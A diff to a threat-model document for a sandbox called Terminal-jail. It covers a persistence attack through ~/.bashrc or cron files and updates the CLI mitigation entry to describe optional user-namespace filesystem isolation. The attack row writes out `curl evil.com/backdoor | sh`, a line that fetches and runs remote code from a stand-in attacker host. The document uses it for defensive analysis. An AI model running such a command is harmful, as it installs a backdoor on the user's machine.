@@ -192,7 +192,7 @@ Terminal-jail consists of three independently deployable layers:
 | **Attack scenario** | `curl evil.com/backdoor | sh` writes to ~/.bashrc or /etc/cron.d/ |
 | **systemd mitigation** | ProtectSystem=strict makes OS read-only; ProtectHome=true hides /home; ReadWritePaths= limits writes to /var/lib/hermes, /var/log/hermes, /var/lib/terminal-jail |
 | **Plugin mitigation** | None |
-| **CLI mitigation** | None (no filesystem isolation — PID namespace only) |
+| **CLI mitigation** | Namespace containment only by default; filesystem isolation where the host permits a uid-mapped `--user` namespace (loud degradation + `scripts/fs-isolation-probe.py` otherwise) |
 | **Residual risk** | Writable paths (/var/lib/hermes) can be modified. If the gateway needs broader write access (project directories, build artifacts), the attack surface expands. An attacker who gains write access to logs could poison log analysis tools. |
 
 ### 5.6 Network Escapes
